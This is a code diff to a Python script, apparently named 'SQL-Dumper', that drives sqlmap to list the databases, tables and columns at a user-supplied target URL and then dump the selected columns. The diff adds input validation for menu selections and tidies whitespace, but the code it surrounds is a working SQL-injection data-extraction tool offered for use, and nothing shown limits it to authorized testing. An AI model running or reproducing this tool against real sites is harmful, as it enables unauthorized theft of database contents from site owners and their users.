@@ -1,5 +1,4 @@
 import subprocess
-import os
 
 def green_bold(text):
     return f"\033[1;32m{text}\033[0m"
@@ -41,15 +40,16 @@ def get_columns(url, db, table):
 def dump_data(url, db, table, columns):
     command = f"sqlmap -u '{url}' --batch -D '{db}' -T '{table}' -C '{columns}' --dump"
     run_sqlmap(command)
+
 ascii_art = '''
 ███████  ██████  ██                ██████   ██████  ██████  ██████  ██      ███████ ██████      
 ██      ██    ██ ██                ██   ██ ██    ██ ██   ██ ██   ██ ██      ██      ██   ██     
 ███████ ██    ██ ██      █████     ██   ██ ██    ██ ██████  ██████  ██      █████   ██████      
      ██ ██ ▄▄ ██ ██                ██   ██ ██    ██ ██      ██      ██      ██      ██   ██     
 ███████  ██████  ███████           ██████   ██████  ██      ██      ███████ ███████ ██   ██     
-            ▀▀                                                                              
-                                                                                                      
+            ▀▀                                                                                  
 '''
+
 def main():
     print(green_bold((ascii_art).center(50)))
     url = input("Enter target URL: ").strip()
@@ -60,11 +60,21 @@ def main():
         if not dbs:
             print("No databases found. Retrying...")
             continue
+
         print("\nDatabases:")
         for idx, db in enumerate(dbs):
             print(f"{idx + 1}. {db}")
-        db_choice = int(input("Select database: ")) - 1
-        database = dbs[db_choice]
+
+        while True:
+            try:
+                db_choice = int(input("Select database (number): ")) - 1
+                if 0 <= db_choice < len(dbs):
+                    database = dbs[db_choice]
+                    break
+                else:
+                    print("Invalid selection. Try again.")
+            except ValueError:
+                print("Please enter a valid number.")
 
         while True:
             # Step 2: Get Tables
@@ -72,11 +82,21 @@ def main():
             if not tables:
                 print("No tables found. Retrying...")
                 continue
+
             print("\nTables:")
             for idx, table in enumerate(tables):
                 print(f"{idx + 1}. {table}")
-            table_choice = int(input("Select table: ")) - 1
-            table = tables[table_choice]
+
+            while True:
+                try:
+                    table_choice = int(input("Select table (number): ")) - 1
+                    if 0 <= table_choice < len(tables):
+                        table = tables[table_choice]
+                        break
+                    else:
+                        print("Invalid selection. Try again.")
+                except ValueError:
+                    print("Please enter a valid number.")
 
             while True:
                 # Step 3: Get Columns
@@ -84,6 +104,7 @@ def main():
                 if not columns:
                     print("No columns found. Retrying...")
                     continue
+
                 print("\nColumns:")
                 for idx, column in enumerate(columns):
                     print(f"{idx + 1}. {column}")
